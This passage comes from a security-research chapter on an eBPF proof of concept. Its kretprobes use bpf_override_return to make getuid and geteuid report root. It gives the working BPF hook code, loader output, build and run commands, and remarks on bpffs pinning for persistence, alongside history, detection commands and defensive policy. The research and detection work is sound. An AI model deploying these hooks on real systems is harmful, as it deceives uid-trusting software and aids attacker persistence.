- `ps` / `top` output — read from `/proc/<pid>/status`, covered above.

The POC in this chapter covers only `getuid` and `geteuid` because the point is to demonstrate the class, not to ship a production-ready uid-hiding rootkit. A reader who wanted the full implementation can extend the POC following the list above; the extensions are mechanical. Each additional hook extends the illusion by one more surface and extends the detection surface by one more attach point.

## Historical lineage

I want to give credit to the prior art here, because this primitive has a long pedigree and the BPF version is one more point on a decades-old curve.

The first generation of this class of bug is the SUID-and-trust-the-user issues of 1990s Unix. Sendmail had several, including the 8.7.x mqueue incident where the daemon trusted fields in a control file that an unprivileged user could influence. The bug there was not in the syscall interface — it was in the daemon trusting a queried value instead of enforcing at the operation point. Same shape as the `getuid` bypass: the enforcer trusted a query.

The second generation is the sudo token-validation CVEs of the 2000s and 2010s. Several versions of sudo had bugs where the timestamp file (tracking whether the user had recently entered their password) could be influenced by the calling user, and sudo trusted the file's contents instead of re-authenticating. CVE-2019-14287 is a near relative: sudo's user-id parsing allowed `-1` to become `uid=0` in certain configurations. Again: trust-the-query versus enforce-at-the-point. The kernel-side credentials were fine; the userspace enforcement layer was reading them from the wrong place.

The third generation is BPF-mechanized. That is this chapter. The pattern is not new; the mechanism of exploitation is new, in the sense that `CAP_BPF` + error-injection + kretprobe gives you a reliable, attach-in-one-line knob for the same class of bug across any function on the error-injection list. It is a force multiplier, not a new class.

Credit the class, not the technique. The defense is the same defense Sendmail and sudo learned the hard way: enforce at the kernel, not at the query. If your code consults `getuid()` to make a security decision, it is wrong regardless of whether a BPF program is forging the return value, because the next generation of attack tools will forge the return value by some other means if this one gets closed. The problem is the consultation pattern, not the specific forging mechanism.

## A look at the ringbuf event stream

The loader's stdout during a typical run looks like this (annotated):

```
[token] symbol=__arm64_sys_getuid	status=present       # preflight succeeded
[token] symbol=__arm64_sys_geteuid	status=present      # preflight succeeded
[token] attached=2	skipped=0                           # both programs attached
[token] tag=target	mode=wildcard                        # wildcard install done
[token] status=ready	msg=token bypass active          # ready for traffic
[token] FORGE pid=19481 comm=sh getuid: 1000 -> 0 (root)  # first forged call
[token] FORGE pid=19482 comm=id geteuid: 1000 -> 0 (root) # `id` called geteuid
[token] FORGE pid=19483 comm=whoami getuid: 1000 -> 0 (root)  # `whoami` called getuid
```

Every `FORGE` line is one forged syscall. The fields are the pid of the calling process, the comm (executable name), the syscall that was forged, the original return value, and the forced `0`. In practice the rate is low enough for a human to read in real time if the loader has an interactive terminal; under automated load it can be thousands per second, which is why the ringbuf is 256 KiB.

Non-forged events (where `is_target()` returns false) are not logged — the `emit` helper fills the ringbuf and the userspace `handle` callback prints only those with `flipped=1`. This keeps the stdout readable while still logging every forge.

The loader also accepts `-v` for verbose libbpf output; under `-v` the kernel's libbpf prints internal debugging information about program load, map creation, and attach. This is essential when something goes wrong and invaluable when developing new primitives; for normal operation it is noise.

## Detection

The strongest signal is attachment-time. A kretprobe on `__arm64_sys_getuid` or `__arm64_sys_geteuid` is a unique fingerprint. Legitimate observability tools do not attach here — there is no diagnostic value in a return-forge probe on the uid-querying syscalls — and the only reason to attach is to forge the return. `bpftool prog list | grep -E 'getuid|geteuid'` on a baseline host returns nothing. The same command on a host with this probe attached returns the two programs. Diff between a baseline capture and a live capture is the fastest alert path.

Policy-wise: any program load on those attach points that also uses `bpf_override_return` is almost certainly malicious. A BPF LSM policy gate on `BPF_PROG_LOAD` that refuses kretprobes on the getuid family is a one-rule fix that costs nothing. The attachment points are obscure enough that legitimate breakage is near-zero.

For userspace tools that must trust their environment — installers, agents, any code that really does need to know its own uid — the cross-check pattern is cheap:

```bash
uid_syscall=$(id -u)
uid_status=$(awk '/^Uid:/ {print $2}' /proc/self/status)
if [ "$uid_syscall" != "$uid_status" ]; then
    # someone is lying to us. Choose your response.
    exit 1
fi
```

This one check defeats the entire primitive. The cost is a file read. The reason no tool does it is historical inertia: thirty years of Linux code wrote `$UID` in shell and trusted it, and nobody has gone back to cross-check. A new generation of tooling could easily ship this check by default. It would be a trivial reviewer request on any new CLI that claims to be "security-aware."

At the fleet level, a defender can instrument the `/proc/self/status`-vs-`id -u` check as a canary job that runs every minute on every host and alerts on mismatch. The canary is cheap, the false-positive rate is zero (absent weird cgroup or container-exec edge cases, which it is worth being pedantic about), and a single alert tells you that *some* return-forging primitive is active in your environment. You do not have to know which one. You do not have to have a signature for it. You only have to know that the two ways of asking the same question disagree.

Policy:

- Do not use `getuid()` for security-relevant decisions in userspace. Consult `/proc/self/status` or, better, restructure so the security decision happens in the kernel.
- For userspace tools that must trust their environment, cross-check uid across two independent sources.
- For infrastructure: BPF LSM policy refusing kretprobe attachment to the getuid family is a one-liner that eliminates the primitive.
- For forensics: `bpftool prog show` over time, diffed against a baseline, reveals every attach of this shape.

Every one of these is cheap. The reason the primitive is worth reading about at all is not that it is hard to defend against — it is that an enormous body of existing code fails to do any of them, and an attacker with `CAP_BPF` gets the entire failure mode for free.

## Fourth-generation concerns: the "trust-the-syscall" refactor

Looking forward from the third-generation BPF version: the fourth generation of this problem is the growing reliance on syscalls as security-decision surfaces in container runtimes, microservice meshes, and userspace policy engines. When a mesh's sidecar queries its local kernel for uid/gid to make an authorization decision in the absence of a stronger identity (say, in an edge environment without mTLS certificates), the mesh is building on exactly the kind of syscall-trust that ch18 exploits.

There is a good engineering argument that syscall return values should never be treated as authoritative for security by any userspace code. Kernel enforcement points exist for exactly this reason. The engineering reality is that cross-checking is expensive (two syscalls instead of one, plus parsing overhead) and most codebases do not bother. The attack surface grows every time a new userspace component reads `getuid` and makes a decision based on it. Without coordinated change in how userspace components reason about identity, the primitive class demonstrated in this chapter stays open indefinitely.

This is the point at which a researcher pounds the table and says "we need a better syscall for this." We do not need a better syscall. We need consumers to stop asking questions of the kernel whose answers depend on the kernel not being lied to via primitives the same consumers' capabilities grant. That is a policy problem, not a mechanism problem, and it is the kind of problem that software ecosystems are consistently bad at solving.

## A note on the loader's lifecycle

The loader handles SIGINT and SIGTERM to unwind cleanly:

```c
struct sigaction sa = { .sa_handler = on_signal };
sigemptyset(&sa.sa_mask);
sigaction(SIGINT, &sa, NULL);
sigaction(SIGTERM, &sa, NULL);
```

On signal, the main poll loop sees `stop = 1` at its next iteration and exits. The `ch18_token_bypass_bpf__destroy(s)` call at the end of `main` detaches the programs via libbpf's skeleton API; the kernel side tears down the kretprobes and unregisters them. After the loader exits, the error-injection overrides are gone, and userspace observes honest uids again.

This matters because an attacker who wanted persistence would need to avoid the clean-unload path — either by pinning the programs to `/sys/fs/bpf/` so they survive the loader exit, or by holding the loader open in a way that cannot be SIGKILLed (which is not possible without elevated privileges the attacker may not have). The POC does not pin because the goal is a short demonstration; a real persistence attack would pin to a bpffs mount and keep the programs live across loader restarts.

Pinning is a separate primitive. It is also a separate detection surface: `ls /sys/fs/bpf/` on any host reveals the pinned BPF objects, which is a strong signal. Pinned programs that no living process has a reference to are particularly suspicious — they represent attack persistence without a parent process to own them.

## Hook points

- `kretprobe/__arm64_sys_getuid`  → `bpf_override_return(ctx, 0)`
- `kretprobe/__arm64_sys_geteuid` → `bpf_override_return(ctx, 0)`

```c
// NOTE: arch-specific symbols. On x86_64 use __x64_sys_getuid / __x64_sys_geteuid.
SEC("kretprobe/__arm64_sys_getuid")
int BPF_KRETPROBE(kr_getuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 0, flip);
    return 0;
}

// NOTE: arch-specific symbol. On x86_64 use __x64_sys_geteuid.
SEC("kretprobe/__arm64_sys_geteuid")
int BPF_KRETPROBE(kr_geteuid, long ret)
{
    int flip = 0;
    if (is_target() && ret != 0) {
        bpf_override_return(ctx, 0);
        flip = 1;
    }
    emit(ret, 1, flip);
    return 0;
}
char LICENSE[] SEC("license") = "GPL";
```

**Category: ILLUSION.** Forging `getuid`/`geteuid` makes `id` show `uid=0(root)` but the kernel's `current->cred->uid` is unchanged. Actual privilege checks (VFS permission via `inode_permission`, capability gates via `cap_capable`, LSM hooks) all consult `current->cred` directly and deny. The "tell": `gid` is still 1001 because `getgid` is not hooked --- `id` output shows `uid=0(root) gid=1001 groups=1001`, which no real root session would produce.

## Build

```
cd pocs/ch18-token-bypass
docker run --rm -v "$PWD/../..":/work -w /work dbpf-base \
  bash -c 'cd pocs/ch18-token-bypass && make'
```

## Run

```
# Wildcard: forge every getuid/geteuid call system-wide.
sudo ./build/ch18-token-bypass --all

# Targeted: forge only calls from a specific tgid.
sudo ./build/ch18-token-bypass --tgid 1234

# Multiple targets are accepted.
sudo ./build/ch18-token-bypass --tgid 1234 --tgid 5678

# Help.
./build/ch18-token-bypass -h
```

In another shell, run the trigger:

```
sudo bash trigger.sh
```

Send `SIGINT` (Ctrl-C) to detach cleanly.

## Detection

- Audit subsystem does not see this. There is no syscall failure, only a forged return.
- `bpftool prog show` reveals two attached kretprobes on `sys_getuid` and `sys_geteuid`. On a production host these are highly anomalous attachment points and should be alerted on.
- File-integrity and kernel-module monitoring will not catch it. No module is loaded.
- Detection works best at the BPF load layer: `bpf()` syscall auditing with `BPF_PROG_LOAD` records, plus a policy rejecting kretprobes that call `bpf_override_return`.
- Consistency check: any monitoring agent that compares `getuid()` return against `/proc/self/status` `Uid:` will flag the divergence. I have not seen anything in the wild doing this by default.

## Limitations / arch notes

- aarch64 only. Symbols are spelled `__arm64_sys_getuid` / `__arm64_sys_geteuid`. On x86_64 they would be `__x64_sys_getuid` / `__x64_sys_geteuid`. The loader's symbol preflight disables affected programs cleanly if absent.
- `bpf_override_return` only succeeds on functions present in `/sys/kernel/debug/error_injection/list`. Both targets happen to be on the linuxkit 6.12 list. On a hardened kernel without these entries, the kretprobe will attach but the override silently no-ops; the loader will still emit non-`flipped` events but the userspace illusion will not occur.
- Userspace illusion only. No kernel access check is bypassed. This is intentional — the POC demonstrates the class of bug, which is identical in shape to the historical "trust-the-query, not-the-cred" CVEs.
- Requires `CAP_SYS_ADMIN` (because `bpf_override_return` demands it — `CAP_BPF`+`CAP_PERFMON` is not sufficient for override). Inside Docker, run with `--privileged --pid=host`.
